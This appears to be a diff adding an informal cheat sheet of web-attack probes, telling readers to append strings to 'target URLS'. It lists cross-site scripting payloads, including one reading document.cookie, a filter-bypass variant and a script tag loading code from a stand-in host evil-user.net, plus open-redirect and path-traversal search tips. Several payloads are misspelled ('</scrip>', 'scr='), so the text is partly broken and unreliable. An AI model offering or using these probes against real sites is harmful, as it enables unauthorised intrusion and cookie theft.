@@ -1,0 +1,57 @@
+Type these codes in end of  your target URLS. 
+evil.com
+
+con.
+
+xss
+
+<script>alert(1)</scrip>
+
+or type this code <script>(1)</scrip>
+
+<sCrIpT>alert(1)</script>
+
+<sCrIpT>alert(1)</sCrIpT>
+
+you can change number also
+
+<>
+
+/sitemap.xml
+
+/robots.txt
+
+?php=
+
+back slash
+
+Type these codes in start of  your target URLS.
+
+view-source: 
+
+Search these in google to search the payloads.
+
+open redirect bypass
+
+path traversal payloads
+
+path traversal vulnerabil
+
+path traversal cheat sheet 
+
+vulnerability payload list
+
+<script>alert(document.domain)</script>
+
+<script>alert(document.cookie)</script>
+
+<scr<script>ip>alert("hello")</script>
+
+<script>alert("hello")</script>
+
+<script scr=https://evil-user.net/badscript.js></script>
+
+you can control webpage from JS
+
+document.body.style.backgroundColor = "red"
+
